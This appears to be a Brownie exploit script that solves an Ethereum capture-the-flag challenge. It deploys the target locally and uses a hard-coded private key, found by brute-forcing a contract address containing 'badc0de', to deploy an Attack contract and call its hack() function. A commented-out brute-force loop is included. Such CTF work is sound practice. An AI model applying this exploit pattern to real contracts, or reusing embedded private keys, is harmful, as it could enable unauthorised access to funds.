#!/usr/bin/python3
import os
import random

import rlp
from brownie import Attack, accounts, web3
from colorama import Fore
from scripts.deploy import deploy
from scripts.helpful_scripts import get_account

# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET


def print_colour(solved):
    if solved:
        print(f"{blue}Is complete: {green}{solved}{reset}")
    else:
        print(f"{blue}Is complete: {red}{solved}{reset}")


def get_private_key():
    # private_key = f"0x{os.urandom(32).hex()}"
    # private_key = "0x" + "".join([format(random.randint(0, 255), 'x').zfill(2) for _ in range(32)])

    private_key = "0xd9049714b21da5008b14de9ebe26051f79cab7025b3aba800a6a7fc4f4267973"
    generated_account = accounts.add(private_key)
    # print(type(account))
    # print(type(attacker))

    nonce = web3.eth.getTransactionCount(generated_account.address)
    contract_address = web3.toChecksumAddress(
        web3.keccak(
            rlp.encode([bytes.fromhex(generated_account.address[2:]), nonce])
        ).hex()[-40:]
    )

    # contract_address = generated_account.address

    print(private_key, contract_address)
    # exit(1)
    return generated_account, contract_address


def hack(contract_address=None, attacker=None):
    if not contract_address:
        target, _ = deploy()
        # _, attacker = get_account()
    else:
        print(f"{red}Something is wrong{reset}")
        exit(-1)

    print_colour(target.isComplete())

    # We can calculate the address of the resulting smart contract before deploying it, so we will brute force the generation of EOA until the contract they generate with their first NONCE contains the specified word
    # counter = 0

    # while(1):

    # 	private_key, contract_address = get_private_key()

    # 	if "badc0de" in contract_address.lower():
    # 		print(f"found: {private_key}")
    # 		#exit(1)
    # 		break

    # 	counter += 1

    # if counter % 1000 == 0:
    # 	print(f"Checked {counter} addresses")

    generated_account, contract_address = get_private_key()

    attcking_contract = Attack.deploy(target.address, {"from": generated_account})

    # print(attacker.address)
    attcking_contract.hack({"from": attcking_contract})

    print_colour(target.isComplete())

    # assert target.isComplete() == True


def main(contract_address=None):
    if contract_address:
        hack(contract_address, get_account())
    else:
        hack()


if __name__ == "__main__":
    main()
